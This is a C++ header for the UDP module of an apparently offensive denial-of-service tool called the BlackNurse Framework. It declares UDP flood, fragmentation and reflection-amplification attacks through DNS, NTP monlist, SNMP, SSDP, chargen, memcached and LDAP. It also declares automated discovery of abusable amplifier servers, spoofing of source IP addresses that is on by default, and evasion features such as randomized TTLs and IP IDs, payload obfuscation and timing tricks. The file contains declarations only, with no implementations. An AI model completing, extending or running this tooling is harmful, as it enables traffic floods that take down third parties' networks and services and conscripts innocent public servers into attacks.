/**
 * BlackNurse Framework  - UDP Protocol Handler
 * 
 * UDP attack capabilities including UDP flood, amplification attacks,
 * DNS amplification, NTP amplification, and sophisticated UDP-based attacks
 */

#pragma once

#include <string>
#include <vector>
#include <memory>
#include <atomic>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <random>
#include <queue>
#include <unordered_map>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#include "../framework/framework_core.hpp"
#include "../common/config.hpp"
#include "../common/logger.hpp"

namespace BlackNurse {

/**
 * UDP Packet Structure
 */
struct UdpPacket {
    // IP Header fields
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t ttl = 64;
    uint16_t id = 0;
    uint16_t frag_off = 0;
    uint8_t tos = 0;
    
    // UDP Header fields
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t length;
    uint16_t checksum = 0;
    
    // Payload
    std::vector<uint8_t> payload;
    
    // Metadata
    std::chrono::steady_clock::time_point timestamp;
    size_t amplification_factor = 1;
};

/**
 * Amplification Service Information
 */
struct AmplificationService {
    std::string name;
    uint16_t port;
    std::vector<uint8_t> query_payload;
    size_t expected_response_size;
    double amplification_ratio;
    std::string description;
    bool requires_spoofing = true;
    std::chrono::milliseconds timeout{1000};
};

/**
 * UDP Attack Configuration
 */
struct UdpAttackConfig {
    AttackType attack_type = AttackType::UDP_FLOOD;
    uint32_t packets_per_second = 10000;
    uint32_t payload_size = 1024;
    uint16_t source_port_min = 1024;
    uint16_t source_port_max = 65535;
    bool randomize_source_ports = true;
    bool randomize_payload = true;
    
    // Amplification specific
    std::vector<std::string> amplification_servers;
    std::string amplification_service = "dns";
    bool use_reflection = true;
    uint32_t max_amplification_factor = 100;
    
    // Fragmentation
    bool enable_fragmentation = false;
    uint16_t fragment_size = 1480;
    bool randomize_fragment_order = false;
    
    // Spoofing
    bool spoof_source_ip = true;
    std::vector<std::string> spoofed_ip_ranges;
    bool validate_spoofed_responses = false;
    
    // Payload options
    std::string custom_payload;
    bool use_malformed_packets = false;
    bool use_oversized_packets = false;
    uint32_t max_packet_size = 65507; // Max UDP payload
    
    // Rate control
    bool adaptive_rate = true;
    double rate_increase_factor = 1.1;
    double rate_decrease_factor = 0.9;
    uint32_t burst_size = 100;
    std::chrono::milliseconds burst_interval{100};
    
    // Evasion
    bool vary_ttl = true;
    uint8_t min_ttl = 32;
    uint8_t max_ttl = 128;
    bool randomize_ip_id = true;
    bool use_different_source_networks = true;
};

/**
 * UDP Protocol Handler Implementation
 */
class UdpHandler : public ProtocolHandler {
public:
    UdpHandler();
    ~UdpHandler() override;
    
    // ProtocolHandler interface
    bool initialize(const blacknurse::Config& config) override;
    bool execute_attack(const Target& target, const AttackConfig& config, AttackStats& stats) override;
    bool supports_attack_type(AttackType type) const override;
    std::vector<EvasionTechnique> get_supported_evasions() const override;
    bool validate_target(const Target& target) const override;
    void cleanup() override;
    
    // UDP-specific methods
    bool send_udp_packet(const UdpPacket& packet);
    bool send_raw_udp_packet(const UdpPacket& packet);
    
    // Attack implementations
    bool execute_udp_flood(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_udp_fragmentation(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_dns_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_ntp_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_snmp_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_ssdp_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_chargen_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_memcached_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_ldap_amplification(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    
    // Enhanced UDP attacks
    bool execute_udp_scan_attack(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_udp_port_exhaustion(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    bool execute_udp_connection_flood(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    
    // Amplification service discovery
    std::vector<std::string> discover_amplification_servers(const std::string& service_type);
    bool test_amplification_server(const std::string& server, const AmplificationService& service);
    double measure_amplification_ratio(const std::string& server, const AmplificationService& service);
    
private:
    // Socket management
    class UdpSocketPool {
    public:
        UdpSocketPool(size_t max_sockets = 1000);
        ~UdpSocketPool();
        
        int get_socket(bool raw_socket = false);
        void return_socket(int socket_fd);
        void cleanup();
        
    private:
        std::vector<int> available_sockets_;
        std::vector<int> raw_sockets_;
        std::mutex pool_mutex_;
        size_t max_sockets_;
        std::atomic<size_t> current_count_{0};
    };
    
    std::unique_ptr<UdpSocketPool> socket_pool_;
    
    // Raw socket for packet crafting
    int raw_socket_fd_ = -1;
    bool raw_socket_available_ = false;
    
    // Amplification services database
    std::unordered_map<std::string, AmplificationService> amplification_services_;
    std::vector<std::string> discovered_servers_;
    std::mutex servers_mutex_;
    
    // Packet crafting
    UdpPacket craft_udp_packet(const Target& target, const UdpAttackConfig& config);
    UdpPacket craft_dns_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_ntp_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_snmp_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_ssdp_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_chargen_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_memcached_query(const Target& target, const std::string& amplifier);
    UdpPacket craft_ldap_query(const Target& target, const std::string& amplifier);
    
    // Packet serialization
    std::vector<uint8_t> serialize_packet(const UdpPacket& packet);
    void serialize_ip_header(std::vector<uint8_t>& buffer, const UdpPacket& packet);
    void serialize_udp_header(std::vector<uint8_t>& buffer, const UdpPacket& packet);
    
    // Fragmentation
    std::vector<UdpPacket> fragment_packet(const UdpPacket& packet, uint16_t fragment_size);
    bool reassemble_fragments(const std::vector<UdpPacket>& fragments, UdpPacket& reassembled);
    
    // Checksum calculation
    uint16_t calculate_ip_checksum(const std::vector<uint8_t>& header);
    uint16_t calculate_udp_checksum(const UdpPacket& packet);
    uint16_t calculate_checksum(const uint8_t* data, size_t length, uint32_t sum = 0);
    
    // Source IP spoofing
    std::vector<uint32_t> spoofed_ips_;
    void generate_spoofed_ips(const std::vector<std::string>& ip_ranges);
    uint32_t get_random_spoofed_ip();
    bool is_valid_spoofed_ip(uint32_t ip);
    
    // Port management
    std::queue<uint16_t> available_ports_;
    std::mutex port_mutex_;
    uint16_t get_random_source_port(const UdpAttackConfig& config);
    void return_source_port(uint16_t port);
    
    // Payload generation
    std::vector<uint8_t> generate_random_payload(size_t size);
    std::vector<uint8_t> generate_malformed_payload(size_t size);
    std::vector<uint8_t> generate_pattern_payload(size_t size, const std::string& pattern);
    std::vector<uint8_t> generate_oversized_payload(size_t size);
    
    // DNS query generation
    std::vector<uint8_t> create_dns_query(const std::string& domain, uint16_t query_type = 255); // ANY query
    std::vector<uint8_t> create_dns_txt_query(const std::string& domain);
    std::vector<uint8_t> create_dns_mx_query(const std::string& domain);
    std::vector<uint8_t> create_dns_ns_query(const std::string& domain);
    
    // NTP query generation
    std::vector<uint8_t> create_ntp_monlist_query();
    std::vector<uint8_t> create_ntp_getpeers_query();
    std::vector<uint8_t> create_ntp_reslist_query();
    
    // SNMP query generation
    std::vector<uint8_t> create_snmp_getbulk_query();
    std::vector<uint8_t> create_snmp_getnext_query();
    
    // Attack workers
    void udp_flood_worker(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    void amplification_worker(const Target& target, const UdpAttackConfig& config, AttackStats& stats, const std::string& service_type);
    void fragmentation_worker(const Target& target, const UdpAttackConfig& config, AttackStats& stats);
    
    // Rate limiting
    std::chrono::steady_clock::time_point last_packet_time_;
    std::mutex rate_limit_mutex_;
    void enforce_rate_limit(uint32_t target_pps);
    void implement_burst_control(const UdpAttackConfig& config);
    
    // Response monitoring
    void start_response_monitor();
    void stop_response_monitor();
    void monitor_responses();
    bool analyze_response(const std::vector<uint8_t>& response, const UdpPacket& original);
    
    // Statistics tracking
    std::atomic<uint64_t> packets_sent_{0};
    std::atomic<uint64_t> amplification_requests_{0};
    std::atomic<uint64_t> amplification_responses_{0};
    std::atomic<uint64_t> total_amplification_bytes_{0};
    std::atomic<double> average_amplification_ratio_{0.0};
    
    // Random generators
    std::random_device rd_;
    std::mt19937 gen_;
    std::uniform_int_distribution<uint16_t> port_dist_;
    std::uniform_int_distribution<uint8_t> ttl_dist_;
    std::uniform_int_distribution<uint16_t> id_dist_;
    std::uniform_int_distribution<uint8_t> byte_dist_;
    
    // Attack state
    std::atomic<bool> attack_active_{false};
    std::atomic<bool> monitor_active_{false};
    std::vector<std::thread> worker_threads_;
    std::thread monitor_thread_;
    std::atomic<bool> shutdown_requested_{false};
    
    // Configuration
    bool initialized_ = false;
    blacknurse::Config framework_config_;
    
    // Utility methods
    bool setup_raw_socket();
    void cleanup_raw_socket();
    bool set_socket_options(int socket_fd, const UdpAttackConfig& config);
    void initialize_amplification_services();
    void log_packet(const UdpPacket& packet, const std::string& direction);
    
    // IP address utilities
    uint32_t string_to_ip(const std::string& ip_str);
    std::string ip_to_string(uint32_t ip);
    bool is_private_ip(uint32_t ip);
    bool is_multicast_ip(uint32_t ip);
    std::vector<uint32_t> generate_ip_range(const std::string& cidr);
    
    // Network discovery
    std::vector<std::string> discover_dns_servers();
    std::vector<std::string> discover_ntp_servers();
    std::vector<std::string> discover_snmp_servers();
    bool is_service_responsive(const std::string& server, uint16_t port, const std::vector<uint8_t>& probe);
    
    // Evasion techniques
    void apply_udp_evasions(UdpPacket& packet, const std::vector<EvasionTechnique>& techniques);
    void apply_ip_fragmentation_evasion(UdpPacket& packet);
    void apply_payload_obfuscation(std::vector<uint8_t>& payload);
    void apply_timing_evasion();
    
    // Performance optimization
    void optimize_socket_buffers(int socket_fd);
    void adjust_worker_count(double cpu_usage);
    void balance_amplification_load();
    
    // Validation and testing
    bool validate_amplification_response(const std::vector<uint8_t>& response, const AmplificationService& service);
    double calculate_actual_amplification_ratio(size_t request_size, size_t response_size);
    bool is_rate_limited_by_target(const Target& target);
};

/**
 * UDP Utility Functions
 */
namespace UdpUtils {
    bool is_valid_port(uint16_t port);
    std::vector<uint16_t> parse_port_range(const std::string& range);
    std::vector<uint32_t> parse_ip_range(const std::string& range);
    std::string generate_random_domain(size_t length = 10);
    std::vector<uint8_t> compress_payload(const std::vector<uint8_t>& payload);
    std::vector<uint8_t> decompress_payload(const std::vector<uint8_t>& compressed);
    bool is_amplification_service_port(uint16_t port);
    std::string get_service_name_by_port(uint16_t port);
    double estimate_bandwidth_amplification(const std::string& service, size_t request_size);
}

} // namespace BlackNurse